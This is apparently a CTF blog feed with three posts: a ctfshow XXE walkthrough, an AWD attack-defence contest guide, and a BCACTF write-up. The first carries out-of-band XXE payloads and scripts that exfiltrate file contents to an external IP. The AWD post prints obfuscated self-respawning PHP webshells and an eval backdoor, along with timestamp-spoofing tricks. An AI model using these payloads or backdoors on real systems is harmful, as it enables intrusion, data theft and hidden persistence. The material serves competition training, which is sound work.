<p>无回显xxe可以利用自己的vps带外输出。</p>
<blockquote>
<p>为区分嵌套实体和实体之间的关系，可以通过单双引号来间隔开，引号中嵌套一个参数实体，其<code>%</code>号需要写成：<code>%</code>，也可写为16进制的<code>%</code></p>
</blockquote>
<p>利用vps外带输出有以下步骤：</p>
<p>test.dtd</p>
<pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">dtd</span> <span class="hljs-string">&quot;&lt;!ENTITY &amp;#x25; xxe  SYSTEM &#x27;http://150.158.181.145:9999/%file;&#x27;&gt; &quot;</span>&gt;</span>
%dtd;
%xxe;</code></pre>
<p>然后看这题</p>
<pre><code class="hljs plaintext">&lt;?php
error_reporting(0);
libxml_disable_entity_loader(false);
$xmlfile = file_get_contents(&#x27;php://input&#x27;);
if(isset($xmlfile))&#123;
    $dom = new DOMDocument();
    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
&#125;
highlight_file(__FILE__);</code></pre>
<p>payload</p>
<pre><code class="hljs plaintext">&lt;!DOCTYPE test [
&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;
&lt;!ENTITY % aaa SYSTEM &quot;http://150.158.181.145/test.dtd&quot;&gt;
%aaa;
]&gt;
&lt;root&gt;123&lt;/root&gt;</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207041742678.png?x-oss-process=hzy" alt="image-20220704174218719"></p>
<p>监听</p>
<pre><code class="hljs plaintext">nc -lvp 9999</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207041743627.png?x-oss-process=hzy" alt="image-20220704174357564"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207041744477.png?x-oss-process=hzy" alt="image-20220704174422422"></p>
<p>这几题都是这样，就略了</p>
<h1 id="web377">web377</h1>
<pre><code class="hljs plaintext">&lt;?php
error_reporting(0);
libxml_disable_entity_loader(false);
$xmlfile = file_get_contents(&#x27;php://input&#x27;);
if(preg_match(&#x27;/&lt;\?xml version=&quot;1\.0&quot;|http/i&#x27;, $xmlfile))&#123;
    die(&#x27;error&#x27;);
&#125;
if(isset($xmlfile))&#123;
    $dom = new DOMDocument();
    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
&#125;
highlight_file(__FILE__);</code></pre>
<p>过滤了http</p>
<p>使用utf-16进行绕过</p>
<p>脚本就行了</p>
<pre><code class="hljs plaintext">import requests
url = &#x27;http://5cbbc523-7be1-47ce-900a-ff43444fc2e4.challenge.ctf.show/&#x27;
payload = &#x27;&#x27;&#x27;
&lt;!DOCTYPE ANY[
&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;
&lt;!ENTITY % remote SYSTEM &quot;http://[vps-ip]/xxe.dtd&quot;&gt;
%remote;
%send;
]&gt;
&#x27;&#x27;&#x27;
payload = payload.encode(&#x27;utf-16&#x27;)
rep = requests.post(url=url, data=payload)
print(rep.text)</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207041753008.png?x-oss-process=hzy" alt="image-20220704175303954"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207041753886.png?x-oss-process=hzy" alt="image-20220704175312827"></p>
<h1 id="web378">web378</h1>
<p>是一个登陆界面</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207041754892.png?x-oss-process=hzy" alt="image-20220704175415813"></p>
<p>可以看到是xml形式</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207041758663.png?x-oss-process=hzy" alt="image-20220704175817598"></p>
<p>poaylaod如下</p>
<pre><code class="hljs plaintext">import requests
url = &#x27;http://a4dbaa21-b059-41c9-8ce5-6900f508a9aa.challenge.ctf.show/&#x27;
payload = &#x27;&#x27;&#x27;
&lt;!DOCTYPE ANY[
&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;
&lt;!ENTITY % remote SYSTEM &quot;http://150.158.181.145/test.dtd&quot;&gt;
%remote;
%send;
]&gt;
&#x27;&#x27;&#x27;
payload = payload.encode(&#x27;utf-16&#x27;)
rep = requests.post(url=url, data=payload)
print(rep.text)</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207041759097.png?x-oss-process=hzy" alt="image-20220704175900019"></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>ctfshow</tag>
        <tag>xxe</tag>
      </tags>
  </entry>
  <entry>
    <title>awd比赛总结</title>
    <url>/2022/05/15/awd/</url>
    <content><![CDATA[<p>awd<strong>比赛总结</strong>记录一下，方便以后回顾使用</p>
<span id="more"></span>
<p>​	awd线上训练参加了很多，对awd也有一定的理解了，比靶场更仿真，更像渗透，同时难度更是上升了很多，在训练的同时也在网上看了很多关于awd的相关知识。</p>
<p>​	首先awd是需要队友之前配合才能取得更高的分数，刚开始一人去负责页面挖洞，另外一个是将源码down下来，还有一个队友负责把批量getshell和批量提交flag的模板写好。</p>
<h1 id="准备阶段">准备阶段</h1>
<p>比赛的相关工具当然少不了</p>
<ul>
<li>D盾（down下来的源码直接扫后门）</li>
<li>WireShark（分析流量包）</li>
<li>攻击框架例如：<a href="https://github.com/SniperOJ/Attack-Defense-Framework/tree/v2">Attack-Defense-Framework</a></li>
<li>burpsuite（搭配其中的工具Reissue Request Scripter，可以根据抓到的请求包直接生成请求脚本）</li>
<li>御剑或者<a href="https://github.com/maurosoria/dirsearch">dirsearch</a>（用来扫网页的后台目录）</li>
<li>nmap或者<a href="https://github.com/zer0h/httpscan">httpscan</a>（用来扫描网段，得到对手机的ip）</li>
<li>服务器管理软件，termius或者winscp等</li>
</ul>
<p>脚本也少不了，尤其是不死马脚本(加密shell防止被别人直接使用)和流量监控脚本，waf的话也得备一下，除此之外还有很多命令，如果记不住那就记录一下，想不出来命令更尴尬。</p>
<h1 id="比赛过程">比赛过程</h1>
<p>​	首先就是备份，非常重要，不仅仅代码审计更是为了防止被被人删掉源码导致服务器宕机，总之开始比赛先备份，没毛病。</p>
<p>​	站点源码可以用winscp进行备份到本地，但是速度会很慢，速度快的方法就是直接用tar打包，放在home目录，最好不要放在tmp目录，因为这个目录没有配置权限，如果在比赛过程中我们拿到了别人的shell，可以去tmp目录看看，说不定有惊喜。</p>
<p>​	tar备份的方法</p>
<pre><code class="hljs plaintext">cd /var/www/html
tar -zcvf ~/html.tar.gz *</code></pre>
<p>还原方法</p>
<pre><code class="hljs plaintext">rm -rf /var/www/html
tar -zxvf ~/html.tar.gz -C /var/www/html</code></pre>
<p>或者</p>
<pre><code class="hljs plaintext">cd /var/www/html
rm -rf *
tar -zxvf ~/html.tar.gz</code></pre>
<p>上面这是站点源码，除此之外还有数据库备份，有的时候数据库里面还有flag，首先找到配置文件，找找账号密码</p>
<pre><code class="hljs plaintext">cd /var/www/html
find .|xargs grep &quot;password&quot;</code></pre>
<p>备份</p>
<pre><code class="hljs plaintext">$ cd /var/lib/mysql #(进入到MySQL库目录，根据自己的MySQL的安装情况调整目录)
$ mysqldump -u root -p Test &gt; Test.sql # 输入密码即可。
$ mysqldump -u root -p --all-databases &gt; ~/backup.sql  # 备份所有数据库
$ mysqldump -u root -p --all-databases -skip-lock-tables &gt; ~/backup.sql  # 跳过锁定的数据库表</code></pre>
<p>还原</p>
<pre><code class="hljs plaintext">$ mysql -u root -p
mysql&gt; create database [database_name];  # 输入要还原的数据库名
mysql&gt; use [database_name]
mysql&gt; source backup.sql;    # source后跟备份的文件名</code></pre>
<p>还原也可以这样</p>
<pre><code class="hljs plaintext">$ cd /var/lib/mysql # (进入到MySQL库目录，根据自己的MySQL的安装情况调整目录)
$ mysql -u root -p Test &lt; Test.sql  # 输入密码即可（将要恢复的数据库文件放到服务器的某个目录下，并进入这个目录执行以上命令）。</code></pre>
<p>备份之后还需要口令修改，ssh，cms，数据库root都需要修改</p>
<p>数据库口令修改，数据库密码修改</p>
<pre><code class="hljs plaintext">$ mysql -u root -p
show databases;
use mysql
set password for root@localhost = password(&#x27;123&#x27;);
或者
update user set password = PASSWORD(&#x27;需要更换的密码&#x27;) where user=&#x27;root&#x27;;
flush privileges;
show tables;   # 看看有没有flag</code></pre>
<p>ssh口令修改，登录ssh之后</p>
<pre><code class="hljs plaintext">passwd[用户]</code></pre>
<p>之后再上传流量监控脚本，它可以让你知道对手是如何攻击你的，你就可以用攻击你的方法攻击其他人</p>
<pre><code class="hljs plaintext">&lt;?php
$ip = $_SERVER[&quot;REMOTE_ADDR&quot;];      //记录访问者的ip
$filename = $_SERVER[&#x27;PHP_SELF&#x27;];       //访问者要访问的文件名
$parameter = $_SERVER[&quot;QUERY_STRING&quot;];      //访问者要请求的参数
$method = $_SERVER[&#x27;REQUEST_METHOD&#x27;];       //请求方法
$uri = $_SERVER[&#x27;REQUEST_URI&#x27;];             //请求URI
$time = date(&#x27;Y-m-d H:i:s&#x27;,time());     //访问时间
$post = file_get_contents(&quot;php://input&quot;,&#x27;r&#x27;);       //接收POST数据
$others = &#x27;...其他你想得到的信息...&#x27;;
$logadd = &#x27;Visit Time：&#x27;.$time.&#x27; &#x27;.&#x27;Visit IP：&#x27;.$ip.&quot;\r\n&quot;.&#x27;RequestURI：&#x27;.$uri.&#x27; &#x27;.$parameter.&#x27;RequestMethod：&#x27;.$method.&quot;\r\n&quot;;
// log记录
$fh = fopen(&quot;/tmp/log.txt&quot;, &quot;a+&quot;);
fwrite($fh, $logadd);
fwrite($fh, print_r($_COOKIE, true).&quot;\r\n&quot;);
fwrite($fh, $post.&quot;\r\n&quot;);
fwrite($fh, $others.&quot;\r\n&quot;);
fclose($fh);
?&gt;</code></pre>
<p>这种脚本一般放置在CMS的入口文件处，下面几个常见CMS的入口地址，在这些入口的文件里使用<code>require_once()</code>就可以将监控脚本包含进去，达到流量监控的目的：</p>
<pre><code class="hljs plaintext">PHPCMS V9 \phpcms\base.php
PHPWIND8.7 \data\sql_config.php
DEDECMS5.7 \data\common.inc.php
DiscuzX2   \config\config_global.php
Wordpress   \wp-config.php
Metinfo   \include\head.php</code></pre>
<p>还有文件监控，文件监控就是将任何没有免死金牌的上传文件全部拦截，上传一个我就自动给你删掉，或者将其中的文件内容直接全部修改掉，这种脚本说实话也是比较危险，看实际情况而定吧，下面就是一个文件监控脚本：</p>
<pre><code class="hljs plaintext"># -*- coding: utf-8 -*-
#use: python file_check.py ./

import os
import hashlib
import shutil
import ntpath
import time

CWD = os.getcwd()
FILE_MD5_DICT = &#123;&#125;      # 文件MD5字典
ORIGIN_FILE_LIST = []

# 特殊文件路径字符串
Special_path_str = &#x27;drops_JWI96TY7ZKNMQPDRUOSG0FLH41A3C5EXVB82&#x27;
bakstring = &#x27;bak_EAR1IBM0JT9HZ75WU4Y3Q8KLPCX26NDFOGVS&#x27;
logstring = &#x27;log_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD&#x27;
webshellstring = &#x27;webshell_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD&#x27;
difffile = &#x27;diff_UMTGPJO17F82K35Z0LEDA6QB9WH4IYRXVSCN&#x27;

Special_string = &#x27;diaossama&#x27;  # 免死金牌
UNICODE_ENCODING = &quot;utf-8&quot;
INVALID_UNICODE_CHAR_FORMAT = r&quot;\?%02x&quot;

# 文件路径字典
spec_base_path = os.path.realpath(os.path.join(CWD, Special_path_str))
Special_path = &#123;
    &#x27;bak&#x27; : os.path.realpath(os.path.join(spec_base_path, bakstring)),
    &#x27;log&#x27; : os.path.realpath(os.path.join(spec_base_path, logstring)),
    &#x27;webshell&#x27; : os.path.realpath(os.path.join(spec_base_path, webshellstring)),
    &#x27;difffile&#x27; : os.path.realpath(os.path.join(spec_base_path, difffile)),
&#125;

def isListLike(value):
    return isinstance(value, (list, tuple, set))

# 获取Unicode编码
def getUnicode(value, encoding=None, noneToNull=False):

    if noneToNull and value is None:
        return NULL

    if isListLike(value):
        value = list(getUnicode(_, encoding, noneToNull) for _ in value)
        return value

    if isinstance(value, unicode):
        return value
    elif isinstance(value, basestring):
        while True:
            try:
                return unicode(value, encoding or UNICODE_ENCODING)
            except UnicodeDecodeError, ex:
                try:
                    return unicode(value, UNICODE_ENCODING)
                except:
                    value = value[:ex.start] + &quot;&quot;.join(INVALID_UNICODE_CHAR_FORMAT % ord(_) for _ in value[ex.start:ex.end]) + value[ex.end:]
    else:
        try:
            return unicode(value)
        except UnicodeDecodeError:
            return unicode(str(value), errors=&quot;ignore&quot;)

# 目录创建
def mkdir_p(path):
    import errno
    try:
        os.makedirs(path)
    except OSError as exc:
        if exc.errno == errno.EEXIST and os.path.isdir(path):
            pass
        else: raise

# 获取当前所有文件路径
def getfilelist(cwd):
    filelist = []
    for root,subdirs, files in os.walk(cwd):
        for filepath in files:
            originalfile = os.path.join(root, filepath)
            if Special_path_str not in originalfile:
                filelist.append(originalfile)
    return filelist

# 计算机文件MD5值
def calcMD5(filepath):
    try:
        with open(filepath,&#x27;rb&#x27;) as f:
            md5obj = hashlib.md5()
            md5obj.update(f.read())
            hash = md5obj.hexdigest()
            return hash
    except Exception, e:
        print u&#x27;[!] getmd5_error : &#x27; + getUnicode(filepath)
        print getUnicode(e)
        try:
            ORIGIN_FILE_LIST.remove(filepath)
            FILE_MD5_DICT.pop(filepath, None)
        except KeyError, e:
            pass

# 获取所有文件MD5
def getfilemd5dict(filelist = []):
    filemd5dict = &#123;&#125;
    for ori_file in filelist:
        if Special_path_str not in ori_file:
            md5 = calcMD5(os.path.realpath(ori_file))
            if md5:
                filemd5dict[ori_file] = md5
    return filemd5dict

# 备份所有文件
def backup_file(filelist=[]):
    # if len(os.listdir(Special_path[&#x27;bak&#x27;])) == 0:
    for filepath in filelist:
        if Special_path_str not in filepath:
            shutil.copy2(filepath, Special_path[&#x27;bak&#x27;])

if __name__ == &#x27;__main__&#x27;:
    print u&#x27;---------start------------&#x27;
    for value in Special_path:
        mkdir_p(Special_path[value])
    # 获取所有文件路径，并获取所有文件的MD5，同时备份所有文件
    ORIGIN_FILE_LIST = getfilelist(CWD)
    FILE_MD5_DICT = getfilemd5dict(ORIGIN_FILE_LIST)
    backup_file(ORIGIN_FILE_LIST) # TODO 备份文件可能会产生重名BUG
    print u&#x27;[*] pre work end!&#x27;
    while True:
        file_list = getfilelist(CWD)
        # 移除新上传文件
        diff_file_list = list(set(file_list) ^ set(ORIGIN_FILE_LIST))
        if len(diff_file_list) != 0:
            # import pdb;pdb.set_trace()
            for filepath in diff_file_list:
                try:
                    f = open(filepath, &#x27;r&#x27;).read()
                except Exception, e:
                    break
                if Special_string not in f:
                    try:
                        print u&#x27;[*] webshell find : &#x27; + getUnicode(filepath)
                        shutil.move(filepath, os.path.join(Special_path[&#x27;webshell&#x27;], ntpath.basename(filepath) + &#x27;.txt&#x27;))
                    except Exception as e:
                        print u&#x27;[!] move webshell error, &quot;%s&quot; maybe is webshell.&#x27;%getUnicode(filepath)
                    try:
                        f = open(os.path.join(Special_path[&#x27;log&#x27;], &#x27;log.txt&#x27;), &#x27;a&#x27;)
                        f.write(&#x27;newfile: &#x27; + getUnicode(filepath) + &#x27; : &#x27; + str(time.ctime()) + &#x27;\n&#x27;)
                        f.close()
                    except Exception as e:
                        print u&#x27;[-] log error : file move error: &#x27; + getUnicode(e)

        # 防止任意文件被修改,还原被修改文件
        md5_dict = getfilemd5dict(ORIGIN_FILE_LIST)
        for filekey in md5_dict:
            if md5_dict[filekey] != FILE_MD5_DICT[filekey]:
                try:
                    f = open(filekey, &#x27;r&#x27;).read()
                except Exception, e:
                    break
                if Special_string not in f:
                    try:
                        print u&#x27;[*] file had be change : &#x27; + getUnicode(filekey)
                        shutil.move(filekey, os.path.join(Special_path[&#x27;difffile&#x27;], ntpath.basename(filekey) + &#x27;.txt&#x27;))
                        shutil.move(os.path.join(Special_path[&#x27;bak&#x27;], ntpath.basename(filekey)), filekey)
                    except Exception as e:
                        print u&#x27;[!] move webshell error, &quot;%s&quot; maybe is webshell.&#x27;%getUnicode(filekey)
                    try:
                        f = open(os.path.join(Special_path[&#x27;log&#x27;], &#x27;log.txt&#x27;), &#x27;a&#x27;)
                        f.write(&#x27;diff_file: &#x27; + getUnicode(filekey) + &#x27; : &#x27; + getUnicode(time.ctime()) + &#x27;\n&#x27;)
                        f.close()
                    except Exception as e:
                        print u&#x27;[-] log error : done_diff: &#x27; + getUnicode(filekey)
                        pass
        time.sleep(2)
        # print &#x27;[*] &#x27; + getUnicode(time.ctime())</code></pre>
<p>一般比赛都会有预留后门，所以可以把自己down下的源码放到d盾里面扫一下，看看有哪些后门，及时删除并试试可以利用预留后门打一下别人</p>
<p>除此之外还有不死马，这个可以权限持续维持，每局都可以得分</p>
<p>一句话木马那方法就很多了，在这就不列举了。还有md5马</p>
<pre><code class="hljs plaintext">&lt;?php
echo &#x27;hello&#x27;;
if(md5($_POST[&#x27;pass&#x27;])==&#x27;042766b4e0c02419a448f2e8ec68d9bc&#x27;)&#123;
   @eval($_POST[&#x27;cmd&#x27;]);
&#125;
?&gt;</code></pre>
<p>不死马也有很多种，但是为了不让别人直使用所以都进行了一定的加密，一种是不断复制自身达到不死，一种是复制多个马到不同目录相互守护，此外有区块链马，不知道是个啥</p>
<pre><code class="hljs plaintext">&lt;?php
    set_time_limit(0);
    ignore_user_abort(true);
    $file = &#x27;.demo.php&#x27;;
    $shell = &quot;&lt;?php $_hR=chr(99).chr(104).chr(114);$_cC=$_hR(101).$_hR(118).$_hR(97).$_hR(108).$_hR(40).$_hR(36).$_hR(95).$_hR(80).$_hR(79).$_hR(83).$_hR(84).$_hR(91).$_hR(49).$_hR(93).$_hR(41).$_hR(59);$_fF=$_hR(99).$_hR(114).$_hR(101).$_hR(97).$_hR(116).$_hR(101).$_hR(95).$_hR(102).$_hR(117).$_hR(110).$_hR(99).$_hR(116).$_hR(105).$_hR(111).$_hR(110);$_=$_fF(&quot;&quot;,$_cC);@$_();?&gt;&quot;;
    //$_hR=&#x27;chr&#x27;
    //$_cC=&#x27;eval($_POST[1]);&#x27;
    //$_fF=&#x27;create_function&#x27;
    while(true)&#123;
        file_put_contents($file, $shell);
        system(&#x27;chmod 777 .demo.php&#x27;);
        touch(&quot;.demo.php&quot;, mktime(11,11,11,11,11,2018));
        usleep(50);
        &#125;
?&gt;</code></pre>
<p>这个demo就是会一直生成<code>.demo.php</code>的一句话木马，可以跟MD5马结合一下。</p>
<p>下面说一下如何杀不死马，结合上面demo.php不死马来说一下咋杀</p>
<pre><code class="hljs plaintext">&lt;?php
while (1) &#123;
 $pid=1234;
 @unlink(&#x27;.demo.php&#x27;);
 exec(&#x27;kill -9 $pid&#x27;);
&#125;
?&gt;</code></pre>
<p>先用<code>ps</code>命令查看进程的pid，再修改一下上面的脚本执行即可</p>
<p>或者可以用<code>ps aux</code>命令来查看每个用户执行的命令和运行的进程</p>
<p>除此之外还有一个杀不死马的方法，写一个脚本不断生成那个不死马的同名文件，使那个不死马无法在该目录下创建文件，然后再找到那个不断创建不死马的进程将其杀死。<br>
比赛中如果抓不到有用的流量，日志分析也是很有用的，分析服务器的访问日志也可以发现一些信息，下面罗列了一些服务器的日志路径</p>
<pre><code class="hljs plaintext">apache: /var/log/apache2/access.log
nginx: /var/log/nginx/</code></pre>
<p>自动化后台执行</p>
<p>​	有时候我们需要在服务器上后台执行一些脚本，这里就需要使用到<code>nohup</code>命令和linux shell中的<code>&amp;</code>命令，<code>nohup</code>可以让命令不挂断地执行，<code>&amp;</code>则可以让命令在后台运行，比如说现在我要在后台执行我的<code>check</code>脚本，我就可以这样写：</p>
<pre><code class="hljs plaintext">nohup python -u ./check.py &gt; log.out &amp;    # 这里-u是禁用缓存，使输出直接进入log.out
# 如果需要运行shell脚本并且需要获得错误信息的话
nohup ./run.sh &gt; log.out 2&gt;&amp;1 &amp;
# 如果不需要记录日志
nohup ./run.sh &gt; /dev/null &amp;Copy</code></pre>
<p>查看它是否在后台执行可以使用<code>jobs</code>命令，输入<code>jobs</code>就可以看到后台运行了什么</p>
<h1 id="最后">最后</h1>
<h2 id="批量提交flag">批量提交flag</h2>
<p>再贴一下非常有用的脚本如果我们不能在对方服务器上种马，只能通过漏洞直接获取flag，那么我们可以通过上一步的自动化脚本在每一轮更新获取到的flag值将其写入文件，然后在本机用脚本批量交</p>
<pre><code class="hljs plaintext">#!/usr/bin/env python2
#coding=utf-8
import sys
import json
import urllib
import httplib
server_host = &#x27;&#x27;    #提交flag的服务器地址
server_port = 80
def submit(team_token, flag, host=server_host, port=server_port, timeout=5):
    if not team_token or not flag:
        raise Exception(&#x27;team token or flag wrong&#x27;)
    conn = httplib.HTTPConnection(host, port, timeout=timeout)
    params = urllib.urlencode(&#123;        #提交需要post的参数,根据情况修改
        &#x27;token&#x27;: team_token,    
        &#x27;flag&#x27;: flag,
    &#125;)
    headers = &#123;
        &quot;Content-type&quot;: &quot;application/x-www-form-urlencode&quot;
    &#125;
    conn.request(&#x27;POST&#x27;, &#x27;[submit_flag_dir]&#x27;, params, headers)    #第二个参数为提交flag的目录
    response = conn.getresponse()
    data = response.read()
    return json.loads(data)

if __name__ == &#x27;__main__&#x27;:
    if len(sys.argv) &lt; 3:
        print &#x27;usage: ./submitflag.py [team_token] [flag]&#x27;
        sys.exit()
    host = server_host
    if len(sys.argv) &gt; 3:
        host = sys.argv[3]
#!/usr/bin/env python2
#coding=utf-8
import sys
import json
import urllib
import httplib
server_host = &#x27;&#x27;    #提交flag的服务器地址
server_port = 80
def submit(team_token, flag, host=server_host, port=server_port, timeout=5):
    if not team_token or not flag:
        raise Exception(&#x27;team token or flag wrong&#x27;)
    conn = httplib.HTTPConnection(host, port, timeout=timeout)
    params = urllib.urlencode(&#123;        #提交需要post的参数,根据情况修改
        &#x27;token&#x27;: team_token,    
        &#x27;flag&#x27;: flag,
    &#125;)
    headers = &#123;
        &quot;Content-type&quot;: &quot;application/x-www-form-urlencode&quot;
    &#125;
    conn.request(&#x27;POST&#x27;, &#x27;[submit_flag_dir]&#x27;, params, headers)    #第二个参数为提交flag的目录
    response = conn.getresponse()
    data = response.read()
    return json.loads(data)

if __name__ == &#x27;__main__&#x27;:
    if len(sys.argv) &lt; 3:
        print &#x27;usage: ./submitflag.py [team_token] [flag]&#x27;
        sys.exit()
    host = server_host
    if len(sys.argv) &gt; 3:
        host = sys.argv[3]
    print json.dumps(submit(sys.argv[1], sys.argv[2], host=host), indent=4)</code></pre>
<p>根据题目灵活修改</p>
<h2 id="不死马理解">不死马理解</h2>
<p><img src="https://z4a.net/images/2022/05/15/image4a0b8d035e5d4b0f.png" alt></p>
<pre><code class="hljs plaintext">&lt;?php
    ignore_user_abort(true);//设置与客户机断开是否会终止脚本的执行，这里设置为true则忽略与用户的断开，即使与客户机断开脚本仍会执行。
    set_time_limit(0);//设置脚本最大执行时间，这里设置为0，即没有时间方面的限制
    unlink(__FILE__);//删除文件本身，以起到隐蔽自身的作用
    $file = &#x27;.busi.php&#x27;;
    $code = &#x27;&lt;?php if(md5($_GET[&quot;pass&quot;])==&quot;1a1dc91c907325c69271ddf0c944bc72&quot;)&#123;@eval($_POST[a]);&#125; ?&gt;&#x27;;
    //pass=pass
    while (1)&#123;
        file_put_contents($file,$code);
        system(&#x27;touch -m -d &quot;2018-12-01 09:10:12&quot; .3.php&#x27;);
        usleep(0);
    &#125;//while循环中每隔usleep(0)即写新的后门文件，system命令用于修改文件的创建时间或修改时间，因为在AWD比赛中有的队伍使用
?&gt;</code></pre>
<p>就拿上面这个不死马来介绍一下，该不死马不断生成.busi.php，通过访问http://localhost/.busi.php?pass=pass ,这个pass内容是md5加密之后的结果，目的是为了防止别人直接使用，MD5理论上不可逆，然后POST a=system(“想要执行的系统命令”);即可通过不死马实现命令执行。如果使用python批量getshell的话大体思路就是</p>
<p>url=http://localhost/.busi.php?pass=pass<br>
data={“a”:”system(“cat /flag”);”}<br>
flag=requests.post(url=url,data=data).text然后url变变就可以，一般会维护一个地址池 从地址池里面取url或者取特征（可能某个url字段不一样）直接打就行，再配合提交flag的api就可以实现自动getflag。</p>
<p>​	检查十分钟内被修改过的php文件，所以我们修改文件日期稍微进行掩饰。</p>
<pre><code class="hljs plaintext">find *.php -mmin -10</code></pre>
<p>在进行杀不死马的时候需要将usleep的值小于不死马的值，让杀马的速度比下马的速度快。</p>
<p>杀死不死马的几种方法</p>
<h3 id="shell脚本直接删除不死马">shell脚本直接删除不死马</h3>
<pre><code class="hljs plaintext">while :
do
   rm -rf .busi.php;
   echo &quot;remove success&quot;;
done</code></pre>
<p>一个循环语句，应该都能看懂，就是让他循环删马</p>
<h3 id="php服务重启">PHP服务重启</h3>
<pre><code class="hljs plaintext">service apache2 restart
service php restart</code></pre>
<p>这个方法在awd应该不能=使用，因为awd给的权限是不够的</p>
<h3 id="杀低权限php进程">杀低权限PHP进程</h3>
<p>php-apache</p>
<pre><code class="hljs plaintext">&lt;?php
system(&quot;kill `ps -ef | grep httpd | grep -v grep | awk &#x27;&#123;print $2&#125;&#x27;`&quot;);</code></pre>
<p>php-fpm</p>
<pre><code class="hljs plaintext">&lt;?php
system(&quot;kill `ps -ef | grep php-fpm | grep -v grep | awk &#x27;&#123;print $2&#125;&#x27;`&quot;);
</code></pre>
]]></content>
      <categories>
        <category>awd</category>
      </categories>
      <tags>
        <tag>awd</tag>
      </tags>
  </entry>
  <entry>
    <title>BCACTF</title>
    <url>/2022/06/04/bcactf/</url>
    <content><![CDATA[<p>国外的比赛，参加一些，多见见题型，大部分都是web，其他的也涉及了一点,就会这些。。。我还是fw，心态炸了。</p>
<span id="more"></span>
<h1 id="web">Web</h1>
<h2 id="real-deal-html">real deal html</h2>
<blockquote>
<p>I have just made the most ultimate html site. This site, this html. This is the real deal</p>
</blockquote>
<p>看源代码得到flag</p>
<p>bcactf{tH4TZ_D4_R34l_D3Al_cb8949}</p>
<h2 id="agent-rocket">Agent Rocket</h2>
<blockquote>
<p>I need to launch the BCA CTF ROCKET to the moon! Unfortunately I lost my launch code (flag). You can find the launch code in the control panel.</p>
</blockquote>
<p><img src="https://z4a.net/images/2022/06/04/image8fdfe5d87124a95e.png" alt="image8fdfe5d87124a95e.png"></p>
<p>看源码得到提示，你说不是就不是了？我偏要试试</p>
<p><img src="https://z4a.net/images/2022/06/04/image992e576d4752966a.png" alt="image992e576d4752966a.png"></p>
<p>成功登陆进去<img src="https://z4a.net/images/2022/06/04/imaged0577bc4699c96a1.png" alt="imaged0577bc4699c96a1.png"></p>
<p>没啥利用点，继续看源码，得到提示<img src="https://z4a.net/images/2022/06/04/image09b1e8eda8dc3982.png" alt="image09b1e8eda8dc3982.png"></p>
<p>一开始我在想控制面板的地址是啥，一直不知道，看到题目提示说在这个页面是进不去控制面板的，很不解，问了一下学长，需要修改UA头，得到flag</p>
<p><img src="https://z4a.net/images/2022/06/04/image32c6aa7d5dd39981.png" alt="image32c6aa7d5dd39981.png"></p>
<p>bcactf{u53r_4g3Nt5_5rE_c0OL_1023}</p>
<h2 id="three-step-trivia">Three Step Trivia</h2>
<blockquote>
<p>Us at BCACTF love staircases so much that we decided to make a trivia quiz about them! Are you a staircase expert? Can you solve all three steps?</p>
</blockquote>
<blockquote>
<p>hint: The internet is a helpful resource</p>
</blockquote>
<p>没啥巧，都是在网上直接搜</p>
<p><img src="https://z4a.net/images/2022/06/10/imaged2569720154aa63f.png" alt="imaged2569720154aa63f.png"></p>
<p>第一个答案是7.75英尺<img src="https://z4a.net/images/2022/06/10/image547dbad65283e0dc.png" alt="image547dbad65283e0dc.png"></p>
<p><img src="https://z4a.net/images/2022/06/10/image625256e12b5f5c04.png" alt="image625256e12b5f5c04.png"></p>
<p>但是只输入7却显示<img src="https://z4a.net/images/2022/06/10/image5cf92ff82129a400.png" alt="image5cf92ff82129a400.png"></p>
<p>猜想是前端校验，f12改一下<img src="https://z4a.net/images/2022/06/10/image42087ad431c746f8.png" alt="image42087ad431c746f8.png"></p>
<p>发送之后又得到个get请求，传7_75<img src="https://z4a.net/images/2022/06/10/image005343135968cad2.png" alt="image005343135968cad2.png"></p>
<p>第二题</p>
<p><img src="https://z4a.net/images/2022/06/10/imagea6c4e0c536c00460.png" alt="imagea6c4e0c536c00460.png"></p>
<p><img src="https://z4a.net/images/2022/06/10/image4c131c41f4c3992d.png" alt="image4c131c41f4c3992d.png"></p>
<p>直接get传11674，第三题<img src="https://z4a.net/images/2022/06/10/image5f43d1c18818c2f9.png" alt="image5f43d1c18818c2f9.png"></p>
<p>依然搜素，The <strong>16th Avenue Tiled Steps</strong> project has been a neighborhood collaboration to create a sea to stars themed mosaic flowing up a 163 <strong>step</strong> stairway located in San Francisco’s Golden Gate Heights Neighborhood.</p>
<p>没有提交按钮，f12看一下</p>
<pre><code class="hljs plaintext">&lt;button type=&quot;submit&quot; class=&quot;btn&quot; style=&quot;visibility: hidden;&quot;&gt;Submit&lt;/button&gt;  // hidden--&gt;visitibly</code></pre>
<p><img src="https://z4a.net/images/2022/06/10/imageb809ff1013ba70c1.png" alt="imageb809ff1013ba70c1.png"></p>
<pre><code class="hljs plaintext">bcactf&#123;sT41r_c4A3_m45T3R_5jfUn9Z&#125;</code></pre>
<h2 id="cookies">Cookies</h2>
<blockquote>
<p>Look, I made a website to teach you how to make cookies. There’s some other recipes there too, and I made a super secure portal to add more.</p>
</blockquote>
<p>主界面长这个样子</p>
<p><img src="https://z4a.net/images/2022/06/04/image4a72e30b6e073f8f.png" alt="image4a72e30b6e073f8f.png"></p>
